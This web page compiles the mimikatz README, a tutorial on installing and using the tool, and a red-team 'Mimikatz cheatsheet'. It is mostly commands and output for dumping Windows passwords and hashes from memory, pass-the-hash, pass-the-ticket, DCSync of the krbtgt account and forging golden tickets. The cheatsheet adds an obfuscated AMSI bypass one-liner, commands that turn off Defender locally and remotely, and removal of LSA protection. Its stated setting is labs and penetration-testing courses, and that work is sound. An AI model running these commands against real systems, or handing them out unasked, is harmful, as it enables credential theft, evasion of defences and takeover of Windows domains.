# mimikatz

[](https://github.com/ParrotSec/mimikatz#mimikatz)

**`mimikatz`** is a tool I've made to learn `C` and make somes experiments with Windows security.

It's now well known to extract plaintexts passwords, hash, PIN code and kerberos tickets from memory. **`mimikatz`** can also perform pass-the-hash, pass-the-ticket or build _Golden tickets_.

```
  .#####.   mimikatz 2.0 alpha (x86) release "Kiwi en C" (Apr  6 2014 22:02:03)
 .## ^ ##.
 ## / \ ##  /* * *
 ## \ / ##   Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
 '## v ##'   http://blog.gentilkiwi.com/mimikatz             (oe.eo)
  '#####'                                    with  13 modules * * */


mimikatz # privilege::debug
Privilege '20' OK
 
mimikatz # sekurlsa::logonpasswords
 
Authentication Id : 0 ; 515764 (00000000:0007deb4)
Session           : Interactive from 2
User Name         : Gentil Kiwi
Domain            : vm-w7-ult-x
SID               : S-1-5-21-1982681256-1210654043-1600862990-1000
        msv :
         [00000003] Primary
         * Username : Gentil Kiwi
         * Domain   : vm-w7-ult-x
         * LM       : d0e9aee149655a6075e4540af1f22d3b
         * NTLM     : cc36cf7a8514893efccd332446158b1a
         * SHA1     : a299912f3dc7cf0023aef8e4361abfc03e9a8c30
        tspkg :
         * Username : Gentil Kiwi
         * Domain   : vm-w7-ult-x
         * Password : waza1234/
...
```

But that's not all! `Crypto`, `Terminal Server`, `Events`, ... lots of informations in the GitHub Wiki [https://github.com/gentilkiwi/mimikatz/wiki](https://github.com/gentilkiwi/mimikatz/wiki) or on [http://blog.gentilkiwi.com](http://blog.gentilkiwi.com/) (in French, _yes_).

If you don't want to build it, binaries are availables on [https://github.com/gentilkiwi/mimikatz/releases](https://github.com/gentilkiwi/mimikatz/releases)

## Quick usage

[](https://github.com/ParrotSec/mimikatz#quick-usage)

```
log
privilege::debug
```

### sekurlsa

[](https://github.com/ParrotSec/mimikatz#sekurlsa)

```
sekurlsa::logonpasswords
sekurlsa::tickets /export

sekurlsa::pth /user:Administrateur /domain:winxp /ntlm:f193d757b4d487ab7e5a3743f038f713 /run:cmd
```

### kerberos

[](https://github.com/ParrotSec/mimikatz#kerberos)

```
kerberos::list /export
kerberos::ptt c:\chocolate.kirbi

kerberos::golden /admin:administrateur /domain:chocolate.local /sid:S-1-5-21-130452501-2365100805-3685010670 /krbtgt:310b643c5316c8c3c70a10cfb17e2e31 /ticket:chocolate.kirbi
```

### crypto

[](https://github.com/ParrotSec/mimikatz#crypto)

```
crypto::capi
crypto::cng

crypto::certificates /export
crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE

crypto::keys /export
crypto::keys /machine /export
```

### vault & lsadump

[](https://github.com/ParrotSec/mimikatz#vault--lsadump)

```
vault::cred
vault::list

token::elevate
vault::cred
vault::list
lsadump::sam
lsadump::secrets
lsadump::cache
token::revert

lsadump::dcsync /user:domain\krbtgt /domain:lab.local
```

## Build

[](https://github.com/ParrotSec/mimikatz#build)

`mimikatz` is in the form of a Visual Studio Solution and a WinDDK driver (optional for main operations), so prerequisites are:

- for `mimikatz` and `mimilib` : Visual Studio 2010, 2012 or 2013 for Desktop (**2013 Express for Desktop is free and supports x86 & x64** - [http://www.microsoft.com/download/details.aspx?id=44914](http://www.microsoft.com/download/details.aspx?id=44914))
- _for `mimikatz driver`, `mimilove` (and `ddk2003` platform) : Windows Driver Kit **7.1** (WinDDK) - [http://www.microsoft.com/download/details.aspx?id=11800](http://www.microsoft.com/download/details.aspx?id=11800)_

`mimikatz` uses `SVN` for source control, but is now available with `GIT` too! You can use any tools you want to sync, even incorporated `GIT` in Visual Studio 2013 =)

### Synchronize!

[](https://github.com/ParrotSec/mimikatz#synchronize)

- GIT URL is : [https://github.com/gentilkiwi/mimikatz.git](https://github.com/gentilkiwi/mimikatz.git)
- SVN URL is : [https://github.com/gentilkiwi/mimikatz/trunk](https://github.com/gentilkiwi/mimikatz/trunk)
- ZIP file is : [https://github.com/gentilkiwi/mimikatz/archive/master.zip](https://github.com/gentilkiwi/mimikatz/archive/master.zip)

### Build the solution

[](https://github.com/ParrotSec/mimikatz#build-the-solution)

- After opening the solution, `Build` / `Build Solution` (you can change architecture)
- `mimikatz` is now built and ready to be used! (`Win32` / `x64` even `ARM64` if you're lucky)
    - you can have error `MSB3073` about `_build_.cmd` and `mimidrv`, it's because the driver cannot be build without Windows Driver Kit **7.1** (WinDDK), but `mimikatz` and `mimilib` are OK.

### ddk2003

[](https://github.com/ParrotSec/mimikatz#ddk2003)

With this optional MSBuild platform, you can use the WinDDK build tools, and the default `msvcrt` runtime (smaller binaries, no dependencies)

For this optional platform, Windows Driver Kit **7.1** (WinDDK) - [http://www.microsoft.com/download/details.aspx?id=11800](http://www.microsoft.com/download/details.aspx?id=11800) and Visual Studio **2010** are mandatory, even if you plan to use Visual Studio 2012 or 2013 after.

Follow instructions:

- [http://blog.gentilkiwi.com/programmation/executables-runtime-defaut-systeme](http://blog.gentilkiwi.com/programmation/executables-runtime-defaut-systeme)
- _[http://blog.gentilkiwi.com/cryptographie/api-systemfunction-windows#winheader](http://blog.gentilkiwi.com/cryptographie/api-systemfunction-windows#winheader)_

## Licence

[](https://github.com/ParrotSec/mimikatz#licence)

CC BY 4.0 licence - [https://creativecommons.org/licenses/by/4.0/](https://creativecommons.org/licenses/by/4.0/)

`mimikatz` needs coffee to be developed:

- PayPal: [https://www.paypal.me/delpy/](https://www.paypal.me/delpy/)

## Author

[](https://github.com/ParrotSec/mimikatz#author)

- Benjamin DELPY `gentilkiwi`, you can contact me on Twitter ( @gentilkiwi ) or by mail ( benjamin [at] gentilkiwi.com )
- DCSync and DCShadow functions in `lsadump` module were co-writed with Vincent LE TOUX, you can contact him by mail ( vincent.letoux [at] gmail.com ) or visit his website ( [http://www.mysmartlogon.com](http://www.mysmartlogon.com/) )

This is a **personal** development, please respect its philosophy and don't use it for bad things!

**Credit:** This information was adapted from an excellent guide on [GitHub](https://github.com/ParrotSec/mimikatz). Be sure to check out the original post for more details.

## What is Mimikatz?

Mimikatz is a tool created by the French developer, Benjamin Delpy used to gather credentials and can carry out a range of operations connected with penetration testing. Its creation stems from a noted vulnerability of the Windows system function called WDigest. WDigest is designed to allow larger Windows-based network users to establish credentials in multiple applications on a LAN or WAN. This feature stores authentication credentials in memory and allows for their automatic reuse so users only have to enter their login details once.

As it turned out, he had created one of the most powerful tools for detecting weaknesses in the security of the Windows system. Currently, pen testers still use Mimikatz as an adjunct along with other utilities for testing Windows security.

## Attack Vectors

Here are five attack vectors that Mimikatz checks for.

- **Pass-the-hash** — NTLM, (or Windows NT LAN Manager) contains hashes which is used to obtain passwords. This system attempts to let end users utilize passwords multiple times without having to reuse the same hash again.
- **Pass-the-Ticket** — The Kerberos system is a network authentication protocol that that works based on tickets which allow nodes communicating over a non-secure network to verify their identity to one another securely. Mimikatz can obtain these tickets from the account of a user and uses them to access the system as this user.
- **Kerberos Golden Ticket** — This gets a ticket for the hidden key Distribution Center Service Account (KRBTGT), which encrypts all authenticity tickets, which provides access to the administrative level domain for any computer in the network.
- **Kerberos Solver Ticket** — This Windows functionality provides users with a ticket that access several services within a network. This lets a possible attacker impersonate a network user.
- **Pass the key** — This gets a unique key, which is used for authentication on a domain controller. An attacker can then use this key multiple times to impersonate a user.

## Mimikatz Installation

Many companies still find this tool useful to detect and correct any weaknesses in their Local Security Authority Subsystem Service security.

[su_box title=”Warning:” style=”glass” box_color=”#ff0000″ radius=”20″]Usage of this program for purposes any other purpose than its intended use is prohibited. Utilizing it to scan for vulnerabilities outside your control or without the permission of the owner may be illegal and subject to criminal prosecution. [/su_box]

### Step 1

First, we will need to open a Windows (or powershell) terminal. To accomplish this, press Win+X and then enter cmd.

### Step 2

Next step would be the [installation of Mimikatz](https://github.com/gentilkiwi/mimikatz/releases). It can be downloaded from GitHub by opening the following link (https://github.com/gentilkiwi/mimikatz/releases). Save it in .zip or .7z format, then unpack the archive and, depending on your system, choose x32 or x64 version. After that, run the file with the ‘.exe’ format. Mimikatz can be also downloaded from the source code and built on your own.

```
Microsoft Windows [Version 10.0.19041.329]
(c) 2019 Microsoft Corporation. All rights reserved.

C:\Users\Katherine>cd Downloads
C:\Users\Katherine\Downloads>cd mimikatz_trunk
C:\Users\Katherine\Downloads\mimikatz_trunk>cd x64
C:\Users\Katherine\Downloads\mimikatz_trunk\x64> .\mimikatz.exe

.#####. mimikatz 2.2.0 (x64) #19041 May 19 2020 00:48:59
.## ^ ##. "A La Vie, A L'Amour" - (oe.eo)
## / \ ## /*** Benjamin DELPY gentilkiwi ( benjamin@gentilkiwi.com )
## \ / ## > http://blog.gentilkiwi.com/mimikatz
'## v ##' Vincent LE TOUX ( vincent.letoux@gmail.com )
'#####' > http://pingcastle.com / http://mysmartlogon.com ***/

mimikatz #
```

Let’s check whether Mimikatz works with the command ‘version’:

```
mimikatz # version

mimikatz 2.2.0 (arch x64)
Windows NT 10.0 build 19041 (arch x64)
msvc 150030729 207

mimikatz #
```

## Mimikatz Modules

There exists a wide range of modules for varying purposes, but we are going to only review a few of the most popular ones.

**Module Standard** — it contains short and simple commands which can be used while working with this tool. Let’s take a look at some standard commands:

- **exit** — quits the program;
- **cls** — clears console;
- **sleep —** switches to sleep mode within several seconds:

```
mimikatz # sleep 4200
Sleep : 4200 ms... End !

mimikatz #
```

- **answer** – developers also like to have fun so this command prints answers to the most important questions in life!
- **cd** – changes or shows the current directory;
- **log** – used for journaling actions and recording logs:

```
mimikatz # log
Using 'mimikatz.log' for logfile : OK

mimikatz #
```

- **coffee** – when there’s no free minute to spare one can use this command to enjoy a short break with a virtual cup of coffee;
- **base64** – switches to printing the output in the terminal instead of recording the files to the disk.
- **Module Privilege** – it contains some commands to work with privileges while working with Mimikatz.

Let’s put Mimikatz into the debugger mode to have more privileges and get a higher access level:

```
mimikatz # privilege::debug
Privilege '20' OK

mimikatz #
```

**Module Crypto** – this module can be used with CryptoAPI functions.

**Providers** – this command gets all providers if they are available:

```
mimikatz # crypto::providers

CryptoAPI providers :
0. RSA_FULL ( 1) - Microsoft Base Cryptographic Provider v1.0
1. DSS_DH (13) - Microsoft Base DSS and Diffie-Hellman Cryptographic Provider
2. DSS ( 3) - Microsoft Base DSS Cryptographic Provider
3. RSA_FULL ( 1) H - Microsoft Base Smart Card Crypto Provider
4. DH_SCHANNEL (18) - Microsoft DH SChannel Cryptographic Provider
5. RSA_FULL ( 1) - Microsoft Enhanced Cryptographic Provider v1.0
6. DSS_DH (13) - Microsoft Enhanced DSS and Diffie-Hellman Cryptographic Provider
7. RSA_AES (24) - Microsoft Enhanced RSA and AES Cryptographic Provider
8. RSA_SCHANNEL (12) - Microsoft RSA SChannel Cryptographic Provider
9. RSA_FULL ( 1) - Microsoft Strong Cryptographic Provider

CryptoAPI provider types:
0. RSA_FULL ( 1) - RSA Full (Signature and Key Exchange)
1. DSS ( 3) - DSS Signature
2. RSA_SCHANNEL (12) - RSA SChannel
3. DSS_DH (13) - DSS Signature with Diffie-Hellman Key Exchange
4. DH_SCHANNEL (18) - Diffie-Hellman SChannel
5. RSA_AES (24) - RSA Full and AES

CNG providers :
0. Microsoft Key Protection Provider
1. Microsoft Passport Key Storage Provider
2. Microsoft Platform Crypto Provider
3. Microsoft Primitive Provider
4. Microsoft Smart Card Key Storage Provider
5. Microsoft Software Key Storage Provider
6. Microsoft SSL Protocol Provider
7. Windows Client Key Protection Provider

mimikatz #
```

**keys** – prints the lists of all providers’ keys (e.g. it can export the keys to terminal):

```
mimikatz # crypto::keys /export
* Store : 'user'
* Provider : 'MS_ENHANCED_PROV' ('Microsoft Enhanced Cryptographic Provider v1.0')
* Provider type : 'PROV_RSA_FULL' (1)
* CNG Provider : 'Microsoft Software Key Storage Provider'

CryptoAPI keys :

CNG keys :
0. Microsoft Connected Devices Platform device certificate
|Provider name : Microsoft Software Key Storage Provider
|Implementation: NCRYPT_IMPL_SOFTWARE_FLAG ;
Key Container : Microsoft Connected Devices Platform device certificate
Unique name : de7cf8a7901d2ad13e5c67c29e5d1662_4446d1b2-0875-4cc5-bdeb-4835813c706d
Algorithm : ECDSA_P256
Key size : 256 (0x00000100)
Export policy : 00000003 ( NCRYPT_ALLOW_EXPORT_FLAG ; NCRYPT_ALLOW_PLAINTEXT_EXPORT_FLAG ; )
Exportable key : YES
LSA isolation : NO
Private export : OK - 'user_cng_0_Microsoft Connected Devices Platform device certificate.dsa.ec.p8k'

mimikatz #
```

**Module Sekurlsa** – it can be used to extract passwords, keys, pin codes, tickets from memory. To work with this module command ‘**privilege::debug**‘ should be used. Starting from Windows 8.x and 10, the passwords are not in memory by default which increases security.

**logonPasswords** – used to get passwords from the memory:

```
mimikatz # sekurlsa::logonPasswords

Authentication Id : 0 ; 143799 (00000000:000231b7)
Session : Interactive from 1
UserName : Katherine
Domain : HOME-PC
Logon Server : HOME-PC
Logon Time : 7/8/2020 12:00:02 PM
SID : S-1-5-21-1137163267-1680361566-2184406797-1001
msv :
[00000003] Primary
* Username : Katherine
* Domain : HOME-PC
* NTLM : 19afbb31b09b2d5eb218675addf4e73c
* SHA1 : e6770dc3e28e6755b49734a818ec7e17e69ef72f
tspkg :
wdigest :
* Username : Katherine
* Domain : HOME-PC
* Password : (null)
kerberos :
* Username : Katherine
* Domain : HOME-PC
* Password : (null)
ssp :
credman :

mimikatz #
```

To run the command line version as an Administrator, we use the following command.

```
mimikatz # sekurlsa::pth /user:Administrateur /domain:winxp /ntlm:f193d757b4d487ab7e5a3743f038f713 /run:cmd
user : Administrateur
domain : winxp
program : cmd
impers. : no
NTLM : f193d757b4d487ab7e5a3743f038f713
| PID 3176
| TID 3188
| LSA Process was already R/W
| LUID 0 ; 408781 (00000000:00063ccd)
\_ msv1_0 - data copy @ 000001F73964A3C0 : OK !
\_ kerberos - data copy @ 000001F739ED3E78
\_ des_cbc_md4 -> null
\_ des_cbc_md4 OK
\_ des_cbc_md4 OK
\_ des_cbc_md4 OK
\_ des_cbc_md4 OK
\_ des_cbc_md4 OK
\_ des_cbc_md4 OK
\_ *Password replace @ 000001F739681E78 (32) -> null

mimikatz #
```

**pth** (Pass-The-Hash) — runs the process of changing the password with other accounts using the password change hash instead of the real password;

**tickets /export** — uses reading from Kerberos tickets memory and doesn’t have restrictions on exporting keys and other commands.

```
mimikatz # sekurlsa::tickets /export
Authentication Id : 0 ; 129210 (00000000:0001f8ba)
Session : Interactive from 1
UserName : Katherine
Domain : HOME-PC
Logon Server : HOME-PC
Logon Time : 7/8/2020 12:47:21 PM
SID : S-1-5-21-1137163267-1680361566-2184406797-1001

     * Username : Katherine
     * Domain : HOME-PC
     * Password : (null)

     Group 0 - Ticket Granting Service

     Group 1 - Client Ticket ?

     Group 2 - Ticket Granting Ticket

Authentication Id : 0 ; 997 (00000000:000003e5)
Session : Service from 0
UserName : LOCAL SERVICE
Domain : NT AUTHORITY
Logon Server : (null)
Logon Time : 7/8/2020 12:47:13 PM
SID : S-1-5-19

     * Username : (null)
     * Domain : (null)
     * Password : (null)

     Group 0 - Ticket Granting Service

     Group 1 - Client Ticket ?
     
     Group 2 - Ticket Granting Ticket

mimikatz #
```

**Module Kerberos** – it can work without any privileges and play around with official Microsoft Kerberos API. Kerberos tickets (e.g. golden and long-term ones) can be created for any users.

**ptt** – this command embeds Kerberos tickets into the current session;

**golden / silver** – this command creates Kerberos tickets with random data for any users, user groups which are required (e.g. Administrator);

**tgt** – it displays information about the current session:

```
mimikatz # kerberos::tgt
Kerberos TGT of current session : no ticket !

mimikatz #
```

**purge** – performs a cleanup of all tickets and many other commands.

There are many commands and modules and to use them one should have the understanding of network structures and their use in Windows. This information can be found on the official web pages. A secure implementation of Kerberos in a group domain setting should avoid the kind of vulnerabilities discussed here.

## Conclusion

In this article we reviewed Mimikatz, learned where and how it can be used, and detailed why it can be both useful and dangerous if used by a malicious individual. We have learned how to install it on Windows and noted some of its basic commands which can be used to determine sensitive information.

Should you decide to employ this utility to secure your Windows network, you will need to keep track of the latest Mimikatz updates and events to fully understand the methods and features used to gain access to the system information.

**Credit:** This information was adapted from an excellent guide on [LiquidWeb](https://www.liquidweb.com/blog/how-to-install-and-use-mimikatz/). Be sure to check out the original post for more details.

# **Mimikatz Cheatsheet**

![](https://miro.medium.com/v2/resize:fit:680/1*knDnDqe4G4CVuEYeerDPlw.jpeg)

**TL;DR** Mimikatz cheatsheet of things I have found useful in [CRTP](https://happycamper84.medium.com/certified-red-team-professional-crtp-exam-course-my-experience-4907dd6f5edc) and the lab.

Welcome to Part I of our cheatsheet series compiled from various courses, labs, stuff we did at work, Google, etc. Most of this was spread out over various howtos. This puts it all in one place. These are cheatsheets, almost no explanation is given, just commands. The links are to howtos that provide background.

Part I: [Mimikatz cheatsheet](https://happycamper84.medium.com/mimikatz-cheatsheet-ad2b88059b4)

Part II: [Set-Acl cheatsheet](https://happycamper84.medium.com/set-acl-cheatsheet-6c79e0c2f32b)

Part III: [Get-Acl cheatsheet](https://happycamper84.medium.com/get-acl-cheatsheet-f7871edf247f)

Part IV: [Enumerating AD cheatsheet](https://happycamper84.medium.com/ad-enumeration-cheatsheet-55a95535f3ee)

Part V: [Windows reverse shells cheatsheet](https://happycamper84.medium.com/windows-reverse-shells-cheatsheet-5eeb09b28c8e)

Part VI: [MS Graph PowerShell cheatsheet](https://happycamper84.medium.com/microsoft-graph-powershell-cheatsheet-d8a841bafa09)

Part VII: [Hash cracking cheatsheet](https://happycamper84.medium.com/hash-cracking-cheatsheet-7c10f2b31143)

Part VIII: [The Credential Theft Shuffle](https://happycamper84.medium.com/the-credential-theft-shuffle-54ec6cd32ea5)

Part IX: [SACLs & Querying Collected Logs](https://happycamper84.medium.com/dangerous-rights-logging-cheatsheet-4b455b686e15)

Part X: [Setting up a simple AD lab in Azure](https://happycamper84.medium.com/how-to-setup-an-ad-lab-in-azure-48a19ff5081b)

**Background**

Yes, this info is out there already, most notably [Sean Metcalf’s Guide to Mimikatz](https://adsecurity.org/?page_id=1821). This is just my personal cheatsheet for Mimikatz compiled from my notes taken during various labs, the [CRTP course](https://happycamper84.medium.com/certified-red-team-professional-crtp-exam-course-my-experience-4907dd6f5edc), etc.

Please note that I was using Invoke-Mimikatz.ps1 most of the time, therefore my cheatsheet is heavy on commands in that syntax. Generally speaking, if you’re using the *.exe then just run what is inside the quotes. I am also partial to PowerShell_ISE.

Please note that you can run multiple commands with Invoke-Mimikatz.ps1 by simply enclosing the entire thing in single quotes and each command in double quotes. Example:

Invoke-Mimikatz -Command ‘”token::elevate” “privilege::debug” “sekurlsa::msv”’

Please note that Medium often mangles quotations, even in codeblocks. If you copy/paste a command and get an error then re-type the quotes in the CLI.

**Running Mimikatz at all**

Defender will block an unaltered copy of Mimikatz. Please do NOT rely on this alone in the workplace. Mimikatz is open source and freely available, therefore a dedicated attacker will simply modify it enough to not trip Defender. [These researchers did it just to prove a point](https://github.com/fir3d0g/mimidogz). Therefore [focus on denying an attacker the rights needed to dump credentials](https://happycamper84.medium.com/mitigating-mimikatz-d9441eaaf20c). Failing that, [focus on basic security hygiene so there isn’t anything usable in the dump](https://happycamper84.medium.com/laps-for-preventing-credential-theft-in-a-windows-domain-e6c040a1eac3).

With that disclaimer out of the way, here is how I have used Mimikatz in labs, [CRTP](https://happycamper84.medium.com/certified-red-team-professional-crtp-exam-course-my-experience-4907dd6f5edc), etc.

Launch PowerShell as admin, add a folder exception to Defender, turn off real time monitoring:

Start-Process PowerShell_ISE -Verb RunASAdd-MpPreference -ExclusionPath “C:\Temp”Set-MpPreference -DisableRealTimeMonitoring $trueImport-Module C:\Temp\Invoke-Mimikatz.ps1

Alternatively you can often get away with just running the AMSI bypass if you can’t turn off Defender. I have used this tactic with PowerView and PowerUp in the past:

S`eT-It`em ( ‘V’+’aR’ + ‘IA’ + (‘blE:1’+’q2') + (‘uZ’+’x’) ) ( [TYpE]( “{1}{0}”-F’F’,’rE’ ) ) ; ( Get-varI`A`BLE ( (‘1Q’+’2U’) +’zX’ ) -VaL ).”A`ss`Embly”.”GET`TY`Pe”(( “{6}{3}{1}{4}{2}{0}{5}” -f(‘Uti’+’l’),’A’,(‘Am’+’si’),(‘.Man’+’age’+’men’+’t.’),(‘u’+’to’+’mation.’),’s’,(‘Syst’+’em’) ) ).”g`etf`iElD”( ( “{0}{2}{1}” -f(‘a’+’msi’),’d’,(‘I’+’nitF’+’aile’) ),( “{2}{4}{0}{1}{3}” -f (‘S’+’tat’),’i’,(‘Non’+’Publ’+’i’),’c’,’c,’ )).”sE`T`VaLUE”( ${n`ULl},${t`RuE} )

![](https://miro.medium.com/v2/resize:fit:700/1*QUvzBD5C16aSqJ2hZ3Edcw.jpeg)

**Bypassing LSA protection**

Additionally, if Mimkatz has an issue with LSA protection this can be disabled by the local admin. If this issue occurs you will likely see something along the lines of

ERROR kuhl_m_sekurlsa_acquireLSA ; Handle on memory (0x00000005)

This protection can be disabled by loading a Mimikatz driver, and credentials can then be dumped.

!+  
!processprotect /process:lsass.exe /remove  
privilege::debug  
sekurlsa::logonpasswords

![](https://miro.medium.com/v2/resize:fit:594/1*OKP3Kh_OLrhJh8UiN3Fgqw.jpeg)

**Dumping creds with Mimikatz:**

This is normally required first if running Mimikatz locally:

Invoke-Mimikatz -Command ‘“token::elevate”’Invoke-Mimikatz -Command ‘“privilege::debug”’Invoke-Mimikatz -Command ‘“sekurlsa::logonpasswords”’

Please note that ‘logonpasswords’ lists everything except Credential Manager, as I found out once.

List the sekurlsa commands:

“sekurlsa::help”

Check Credential Manager for things like saved RDP passwords:

Invoke-Mimikatz -Command ‘“token::elevate” “vault::cred /patch”’Invoke-Mimikatz -Command '"sekurlsa::credman"'

If you are using mimikatz.exe:

Start-Process C:\Temp\mimikatz_trunk\x64\mimikatz.exe -Verb RunAstoken::elevateprivilege::debugsekurlsa::msv

![](https://miro.medium.com/v2/resize:fit:585/1*DpB1n7ZBeLYZ7fnobzTjQQ.jpeg)

Other useful things to dump:

vault::cred #dump Credential Manager  
  
lsadump::sam #dump the SAM  
  
lsadump::cache #dump cached Domain credentials (these must be cracked, PTH doesn't work on mscache)

**Pass-The-Hash (PTH) with Mimikatz**

Explanation, lab demo, and mitigations are [here](https://happycamper84.medium.com/generating-a-golden-ticket-in-the-lab-4740efa22f34).

PTH and launch PowerShell_ISE as that user:

Invoke-Mimikatz -Command ‘“sekurlsa::pth /user:administrator /domain:corp /ntlm:03df526c49c8684ebed22fdb3ec5c533 /run:PowerShell_ISE”’

**Pass-The-Ticket (PTT) with Mimikatz**

Explanation, lab demo, and mitigations are [here](https://happycamper84.medium.com/unconstrained-delegation-ptt-fa8a72eec34d).

Export & list tickets:

$sess = New-PSSession -ComputerName TestIPAMInvoke-Command -ScriptBlock {Set-MpPreference –DisableRealTimeMonitoring $true} -ComputerName TestIPAMInvoke-Command -FilePath C:\Temp\Invoke-Mimikatz.ps1 -Session $sessEnter-PSSession $sessmkdir etccd .\etcInvoke-Mimikatz -Command ‘“sekurlsa::tickets /export”’

Copy/paste the name of the ticket to elevate with, then:

Invoke-Mimikatz -Command ‘“kerberos::ptt .\<ticket filename>”’

Confirm privileges:

Invoke-Command -ScriptBlock {hostname;whoami} -ComputerName TestDC

Show tickets currently in use:

klist

If you are having issues or getting weird errors, purge tickets and try again:

klist purge

**Dump creds remotely with Mimikatz**

This only requires that you are running as a Domain User who has local admin rights on the remote system.

Invoke-Command –ScriptBlock {Set-MpPreference –DisableRealTimeMonitoring $true} –ComputerName DCInvoke-Mimikatz -DumpCreds -ComputerName DC

**DCSync**

Explanation & lab demo [here](https://happycamper84.medium.com/generating-a-golden-ticket-in-the-lab-4740efa22f34).

Grab the krbtgt NTLM

Invoke-Mimikatz -Command ‘”lsadump::dcsync /user:corp\krbtgt”’

Forge a Golden Ticket using krbtgt hash & domain SID:

Invoke-Mimikatz -Command ‘”kerberos::golden /domain:corp.local /sid:S-1–5–21–1917967189–4054103991–136247481 /krbtgt:cb542d2484aae7b5156c9a1a7bbb31e7 /user:Administrator /id:500 /ptt”’

Alternatively, save the ticket for future use:

kerberos::golden /domain:corp.local /sid:S-1–5–21–1917967189–4054103991–136247481 /krbtgt:cb542d2484aae7b5156c9a1a7bbb31e7 /user:Administrator /id:500 /ticket:forged.kirbikerberos::ptt forged.kirbimisc::cmd

Dump every hash in the domain into a file for use later:

Invoke-Mimikatz -Command ‘“token::elevate” “privilege::debug” “lsadump::dcsync /dc:BackupDC4 /domain:test.local /all /csv”’ | Export-Csv .\AllHashes.csv

**Forge a ticket to use in a trusting domain**

In this case we have compromised a child domain and want to escalate to the parent domain. There is a trust relationship between them.

Invoke-Mimikatz -Command ‘“kerberos::golden /user:Administrator /domain:<child domain FQDN> /sid:<child domain SID> /sids:<parent domain SID>-519 /krbtgt:<child domain krbtgt NTLM> /ticket:C:\AD\Tools\krbtgt_tkt.kirbi”’

Load the ticket and start using privs in the parent domain:

Invoke-Mimikatz -Command ‘“kerberos::ptt C:\AD\Tools\krbtgt_tkt.kirbi”’

**References**

Benjamin Delpy’s github with Mimikatz: [https://github.com/ParrotSec/mimikatz](https://github.com/ParrotSec/mimikatz)

Sean Metcalf’s guide to Mimikatz: [https://adsecurity.org/?page_id=1821](https://adsecurity.org/?page_id=1821)

Microsoft Docs on klist: [https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/klist](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/klist)

**Credit:** This information was adapted from an excellent guide on [Medium](https://happycamper84.medium.com/mimikatz-cheatsheet-ad2b88059b4). Be sure to check out the original post for more details.

<iframe width="560" height="315" src="https://www.youtube.com/embed/AZirvtZNIEw?si=lOzfNn-MI4JqQTLX" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

**Credit:** This information was adapted from an excellent guide on [YouTube](https://www.youtube.com/watch?v=AZirvtZNIEw&t=74s). Be sure to check out the original post for more details.

<iframe width="560" height="315" src="https://www.youtube.com/embed/_KppC5wkrgU?si=DU7SA2Jz-KiCVam9" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

**Credit:** This information was adapted from an excellent guide on [YouTube](https://www.youtube.com/watch?v=_KppC5wkrgU). Be sure to check out the original post for more details.

<iframe width="560" height="315" src="https://www.youtube.com/embed/wH2kE527cwQ?si=nmym67wk2hCNIvWl" title="YouTube video player" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share" referrerpolicy="strict-origin-when-cross-origin" allowfullscreen></iframe>

**Credit:** This information was adapted from an excellent guide on [YouTube](https://www.youtube.com/watch?v=wH2kE527cwQ). Be sure to check out the original post for more details.




